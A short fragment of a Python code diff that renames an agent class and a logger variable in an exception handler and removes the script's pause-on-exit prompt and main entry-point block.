-        agent = SupportAgent()
+        agent = Agent()
         agent.run()
     except Exception as e:
-        logger.error(f"Fatal error: {e}")
+        log.error(f"Fatal error: {e}")
         import traceback
         traceback.print_exc()
-        input("Press Enter to exit...")
-
-
-if __name__ == "__main__":
-    main()
